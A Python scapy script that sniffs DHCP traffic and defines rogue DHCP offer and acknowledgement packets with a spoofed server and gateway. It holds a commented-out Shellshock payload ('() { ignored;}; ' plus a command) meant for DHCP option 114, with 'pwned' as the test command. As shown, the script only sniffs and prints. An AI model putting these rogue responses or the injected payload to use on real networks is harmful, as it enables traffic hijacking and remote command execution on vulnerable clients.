
from __future__ import print_function
from scapy.all import *
import time
import binascii

command = "echo 'pwned'"

if os.geteuid() != 0:
    sys.exit("Run as root ~sudo su")

f= open("log.txt","w+")

# Fixup function to extract dhcp_options by key
def get_option(dhcp_options, key):

    must_decode = ['hostname', 'domain', 'vendor_class_id']
    try:
        for i in dhcp_options:
            if i[0] == key:
                # If DHCP Server Returned multiple name servers
                # return all as comma seperated string.
                if key == 'name_server' and len(i) > 2:
                    return (",".join(i[1:]))
                # domain and hostname are binary strings,
                # decode to unicode string before returning
                elif key in must_decode:
                    return i[1].decode()
                else:
                    return i[1]
    except:
        pass


def dhcp_offer(raw_mac, xid):
    packet = (Ether(src=get_if_hwaddr('wlp6s0'), dst='ff:ff:ff:ff:ff:ff') /
              IP(src="192.168.1.111", dst='192.168.1.255') /
              UDP(sport=67, dport=68) /
              BOOTP(op='BOOTREPLY', chaddr=raw_mac, yiaddr='192.168.2.4', siaddr='192.168.1.111', xid=xid) /
              DHCP(options=[("message-type", "offer"),
                            ('server_id', '192.168.1.111'),
                            ('subnet_mask', '255.255.255.0'),
                            ('router', '192.168.2.5'),
                            ('lease_time', 172800),
                            ('renewal_time', 86400),
                            ('rebinding_time', 138240),
                            "end"]))

    return packet


def dhcp_ack(raw_mac, xid, command):
    packet = (Ether(src=get_if_hwaddr('wlp6s0'), dst='ff:ff:ff:ff:ff:ff') /
              IP(src="192.168.1.111", dst='192.168.1.255') /
              UDP(sport=67, dport=68) /
              BOOTP(op='BOOTREPLY', chaddr=raw_mac, yiaddr='192.168.2.4', siaddr='192.168.1.111', xid=xid) /
              DHCP(options=[("message-type", "ack"),
                            ('server_id', '192.168.1.111'),
                            ('subnet_mask', '255.255.255.0'),
                            ('router', '192.168.2.5'),
                            ('lease_time', 172800),
                            ('renewal_time', 86400),
                            ('rebinding_time', 138240),
                            "end"]))
                            # (114, "() { ignored;}; " + command),
                            
    return packet


def handle_req(packet):

    if packet.haslayer(DHCP):
        mac_addr = packet[Ether].src
        raw_mac = binascii.unhexlify(mac_addr.replace(":", ""))

        # Match DHCP discover
        if DHCP in packet and packet[DHCP].options[0][1] == 1:
            print('New DHCP Discover')
            print(packet.summary())
            print('-- LS PACKET ----\n')
            #  print(packet.show())
            # f.write(ls(packet))

        # Match DHCP offer
        elif DHCP in packet and packet[DHCP].options[0][1] == 2:
            print('---')
            print('New DHCP OFFER')
            print(packet.summary())
            print('-- LS PACKET ----\n')
            #  print(packet.show())
            # f.write(ls(packet))
        
        # Match DHCP request
        elif DHCP in packet and packet[DHCP].options[0][1] == 3:
            print('---')
            print('New DHCP Request')
            print(packet.summary())
            print('-- LS PACKET ----\n')
            #  print(packet.show())
            # f.write(ls(packet))

        # Match DHCP ack
        elif DHCP in packet and packet[DHCP].options[0][1] == 5:
            print('---')
            print('New DHCP Ack')
            print(packet.summary())
            print('-- LS PACKET ----\n')
            #  print(packet.show())
            # f.write(ls(packet))

        # Match DHCP inform
        elif DHCP in packet and packet[DHCP].options[0][1] == 8:
            print('---')
            print('New DHCP Inform')
            print(packet.summary())
            print('-- LS PACKET ----\n')
            # f.write(ls(packet))

        else:
            print('---')
            print('Some Other DHCP Packet')
            print(packet.summary())
            print('-- LS PACKET ----\n')
            #  print(packet.show())
            # f.write(ls(packet))

    elif packet.haslayer(DNS):
      print('---')
      print('DNS Call')
      print(packet)

    return


if __name__ == "__main__":
  try:
    sniff(filter="udp and (port 67 or 68)",iface='wlp6s0', prn=handle_req)
  except KeyboardInterrupt:
    f.close()
